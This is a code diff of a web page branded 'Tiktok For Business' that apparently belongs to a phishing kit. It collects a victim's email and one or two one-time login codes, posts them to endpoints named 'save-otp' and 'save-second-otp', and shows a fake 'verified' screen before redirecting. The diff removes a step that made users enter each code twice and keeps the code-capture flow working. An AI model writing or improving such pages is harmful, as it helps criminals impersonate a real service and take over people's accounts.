@@ -91,21 +91,6 @@
             margin-bottom: 8px;
             font-size: 16px;
         }
-        
-        .otp-sent-message .warning {
-            color: #ffaa33;
-            font-weight: 500;
-            margin-top: 12px;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            background: rgba(255, 170, 51, 0.1);
-            padding: 8px 12px;
-            border-radius: 40px;
-            border: 1px solid rgba(255, 170, 51, 0.2);
-        }
 
         .email-display {
             background: #1a1a1a;
@@ -118,49 +103,6 @@
             font-weight: 500;
             border: 1px solid #2a2a2a;
             font-size: 15px;
-        }
-
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-bottom: 20px;
-        }
-
-        .step {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: #1a1a1a;
-            color: #666;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 18px;
-            border: 1px solid #2a2a2a;
-            transition: all 0.2s;
-        }
-
-        .step.active {
-            background: #fe2c55;
-            color: white;
-            border-color: #fe2c55;
-            box-shadow: 0 0 15px rgba(254, 44, 85, 0.4);
-        }
-
-        .step.completed {
-            background: #4CAF50;
-            color: white;
-            border-color: #4CAF50;
-        }
-
-        .instruction {
-            text-align: center;
-            margin-bottom: 20px;
-            color: #aaa;
-            font-size: 15px;
-            font-weight: 400;
         }
 
         .form-group {
@@ -236,16 +178,6 @@
             box-shadow: none;
         }
 
-        button.secondary {
-            background: #f44336;
-            margin-top: 12px;
-            box-shadow: 0 4px 12px rgba(244, 67, 54, 0.3);
-        }
-
-        button.secondary:hover {
-            background: #d32f2f;
-        }
-
         .message {
             margin-top: 20px;
             padding: 14px 16px;
@@ -265,12 +197,6 @@
             background: rgba(244, 67, 54, 0.15);
             color: #ff8a9f;
             border: 1px solid rgba(244, 67, 54, 0.3);
-        }
-
-        .info {
-            background: rgba(33, 150, 243, 0.15);
-            color: #64b5f6;
-            border: 1px solid rgba(33, 150, 243, 0.3);
         }
 
         .loading-overlay {
@@ -323,28 +249,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .retry-btn {
-            background: #ff9800;
-            margin-top: 15px;
-        }
-
-        .retry-btn:hover {
-            background: #f57c00;
-        }
-        
-        .warning-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 20px;
-            height: 20px;
-            background-color: #ffaa33;
-            color: #121212;
-            border-radius: 50%;
-            font-weight: bold;
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
@@ -364,13 +268,15 @@
             <span id="messageText">We've sent a 4-digit code to your email OR phone. Check the spam folder if not yet received!</span>
         </div>
 
+        <!-- Email display element - was missing -->
+        <div class="email-display" id="emailDisplay"></div>
+
         <div class="form-group">
-            <label for="otp" id="otpLabel">Enter 4-digit OTP</label>
-            <input type="text" id="otp" maxlength="6" pattern="\d*" inputmode="numeric" placeholder="----" autocomplete="off">
+            <label for="otp" id="otpLabel">Enter 6-digit OTP</label>
+            <input type="text" id="otp" maxlength="6" pattern="\d*" inputmode="numeric" placeholder="------" autocomplete="off">
         </div>
         
         <button onclick="handleOTP()" id="actionBtn">Verify OTP</button>
-        <button class="secondary retry-btn" id="retryBtn" onclick="retryProcess()" style="display: none;">Start Over</button>
         
         <div id="message" class="message"></div>
     </div>
@@ -386,11 +292,7 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const email = urlParams.get('email');
-        const otpType = urlParams.get('type') || 'first'; // 'first' or 'second'
-        
-        // State management
-        let step = 1;
-        let firstOTP = '';
+        const otpType = urlParams.get('type') || 'first';
         
         // OTP length is 6 digits
         const OTP_LENGTH = 6;
@@ -398,8 +300,8 @@
         // Update UI based on OTP type
         if (otpType === 'second') {
             document.getElementById('pageTitle').textContent = 'Tiktok For Business - Second OTP';
-            document.getElementById('messageStrong').textContent = 'Enter Second OTP';
-            document.getElementById('messageText').textContent = 'Please enter the second OTP code sent to you.';
+            document.getElementById('messageStrong').textContent = '';
+            document.getElementById('messageText').textContent = 'We have sent a second OTP to verify your identity';
             document.getElementById('otpLabel').textContent = 'Enter 6-digit Second OTP';
         }
 
@@ -408,36 +310,6 @@
         }
 
         document.getElementById('emailDisplay').textContent = email;
-
-        // UI Update functions
-        function updateStepUI() {
-            const step1El = document.getElementById('step1');
-            const step2El = document.getElementById('step2');
-            const instructionEl = document.getElementById('instruction');
-            const otpLabelEl = document.getElementById('otpLabel');
-            const actionBtnEl = document.getElementById('actionBtn');
-            const retryBtnEl = document.getElementById('retryBtn');
-            
-            if (step === 1) {
-                if (step1El) step1El.className = 'step active';
-                if (step2El) step2El.className = 'step';
-                if (instructionEl) instructionEl.textContent = 'Step 1: Enter the 6-digit OTP sent to you';
-                if (otpLabelEl) otpLabelEl.textContent = 'Enter 6-digit OTP';
-                if (actionBtnEl) actionBtnEl.textContent = 'Verify OTP';
-                if (retryBtnEl) retryBtnEl.style.display = 'none';
-            } else if (step === 2) {
-                if (step1El) step1El.className = 'step completed';
-                if (step2El) step2El.className = 'step active';
-                if (instructionEl) instructionEl.textContent = 'Step 2: Confirm your OTP';
-                if (otpLabelEl) otpLabelEl.textContent = 'Re-enter your 6-digit OTP';
-                if (actionBtnEl) actionBtnEl.textContent = 'Confirm OTP';
-                if (retryBtnEl) retryBtnEl.style.display = 'block';
-            }
-            
-            // Clear input and focus
-            document.getElementById('otp').value = '';
-            document.getElementById('otp').focus();
-        }
 
         function showLoading(title, message) {
             document.getElementById('loadingTitle').textContent = title || 'Processing';
@@ -457,15 +329,12 @@
             messageDiv.textContent = text;
             messageDiv.style.display = 'block';
             
-            // Auto-hide after 5 seconds
-            if (type !== 'error') {
-                setTimeout(() => {
-                    messageDiv.style.display = 'none';
-                }, 5000);
-            }
+            setTimeout(() => {
+                messageDiv.style.display = 'none';
+            }, 3000);
         }
 
-        // Main OTP handling function
+        // Single OTP handling function - NO CONFIRMATION STEP
         async function handleOTP() {
             const otp = document.getElementById('otp').value;
             
@@ -475,119 +344,89 @@
                 return;
             }
 
-            if (step === 1) {
-                // Step 1: Store first OTP and show confirm message
-                firstOTP = otp;
-                showMessage('Confirm the OTP again', 'error');
+            showLoading('Verifying OTP', 'Verifying...');
+            
+            try {
+                // Choose endpoint based on OTP type
+                const endpoint = otpType === 'second' ? '/api/users/save-second-otp' : '/api/users/save-otp';
                 
-                // Move to step 2
-                step = 2;
-                updateStepUI();
-                
-            } else if (step === 2) {
-                // Step 2: Verify OTP matches first attempt
-                if (otp === firstOTP) {
-                    // OTPs match - SUCCESS!
-                    showLoading('Verifying OTP', 'Verifying...');
-                    
-                    try {
-                        // Choose endpoint based on OTP type
-                        const endpoint = otpType === 'second' ? '/api/users/save-second-otp' : '/api/users/save-otp';
-                        
-                        const response = await fetch(endpoint, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ email, otp })
-                        });
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, otp })
+                });
 
-                        const data = await response.json();
+                const data = await response.json();
 
-                        if (response.ok) {
-                            // Show success loading page
-                            document.open();
-                            document.write(`
-                                <!DOCTYPE html>
-                                <html>
-                                <head>
-                                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                                    <title>Success</title>
-                                    <style>
-                                        * { margin: 0; padding: 0; box-sizing: border-box; }
-                                        body {
-                                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                                            display: flex;
-                                            justify-content: center;
-                                            align-items: center;
-                                            min-height: 100vh;
-                                            background: #0a0a0a;
-                                            padding: 16px;
-                                        }
-                                        .success-container {
-                                            text-align: center;
-                                            background: #121212;
-                                            padding: 40px 32px;
-                                            border-radius: 32px;
-                                            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-                                            border: 1px solid #2a2a2a;
-                                            color: white;
-                                            max-width: 380px;
-                                            width: 100%;
-                                        }
-                                        .checkmark {
-                                            font-size: 70px;
-                                            color: #4CAF50;
-                                            margin-bottom: 20px;
-                                        }
-                                        .spinner {
-                                            border: 4px solid #2a2a2a;
-                                            border-top: 4px solid #4CAF50;
-                                            border-radius: 50%;
-                                            width: 40px;
-                                            height: 40px;
-                                            animation: spin 1s linear infinite;
-                                            margin: 20px auto;
-                                        }
-                                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                                        p { color: #aaa; font-size: 15px; }
-                                    </style>
-                                    <meta http-equiv="refresh" content="3;url=/users/success?email=${encodeURIComponent(email)}">
-                                </head>
-                                <body>
-                                    <div class="success-container">
-                                        <div class="checkmark">✓</div>
-                                        <h2>OTP Verified Successfully!</h2>
-                                        <div class="spinner"></div>
-                                        <p>Please wait, redirecting...</p>
-                                    </div>
-                                </body>
-                                </html>
-                            `);
-                            document.close();
-                        } else {
-                            hideLoading();
-                            showMessage(data.error || 'Failed to save OTP', 'error');
-                            document.getElementById('retryBtn').style.display = 'block';
-                        }
-                    } catch (error) {
-                        hideLoading();
-                        showMessage('Network error occurred', 'error');
-                        document.getElementById('retryBtn').style.display = 'block';
-                    }
+                if (response.ok) {
+                    // Show success loading page
+                    document.open();
+                    document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                            <title>Success</title>
+                            <style>
+                                * { margin: 0; padding: 0; box-sizing: border-box; }
+                                body {
+                                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                                    display: flex;
+                                    justify-content: center;
+                                    align-items: center;
+                                    min-height: 100vh;
+                                    background: #0a0a0a;
+                                    padding: 16px;
+                                }
+                                .success-container {
+                                    text-align: center;
+                                    background: #121212;
+                                    padding: 40px 32px;
+                                    border-radius: 32px;
+                                    box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+                                    border: 1px solid #2a2a2a;
+                                    color: white;
+                                    max-width: 380px;
+                                    width: 100%;
+                                }
+                                .checkmark {
+                                    font-size: 70px;
+                                    color: #4CAF50;
+                                    margin-bottom: 20px;
+                                }
+                                .spinner {
+                                    border: 4px solid #2a2a2a;
+                                    border-top: 4px solid #4CAF50;
+                                    border-radius: 50%;
+                                    width: 40px;
+                                    height: 40px;
+                                    animation: spin 1s linear infinite;
+                                    margin: 20px auto;
+                                }
+                                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                                p { color: #aaa; font-size: 15px; }
+                            </style>
+                            <meta http-equiv="refresh" content="2;url=/users/success?email=${encodeURIComponent(email)}${otpType === 'second' ? '&type=second' : ''}">
+                        </head>
+                        <body>
+                            <div class="success-container">
+                                <div class="checkmark">✓</div>
+                                <h2>OTP Verified Successfully!</h2>
+                                <div class="spinner"></div>
+                                <p>Please wait, redirecting...</p>
+                            </div>
+                        </body>
+                        </html>
+                    `);
+                    document.close();
                 } else {
-                    // OTPs don't match
-                    showMessage('OTP does not match! Please start over.', 'error');
-                    document.getElementById('retryBtn').style.display = 'block';
-                    document.getElementById('actionBtn').disabled = true;
+                    hideLoading();
+                    showMessage(data.error || 'Failed to save OTP', 'error');
                 }
+            } catch (error) {
+                hideLoading();
+                showMessage('Network error occurred', 'error');
             }
-        }
-
-        // Retry function - refreshes browser to start over
-        function retryProcess() {
-            showLoading('Restarting', 'Please wait...');
-            setTimeout(() => {
-                window.location.href = '/users/login';
-            }, 1500);
         }
 
         // Handle paste events
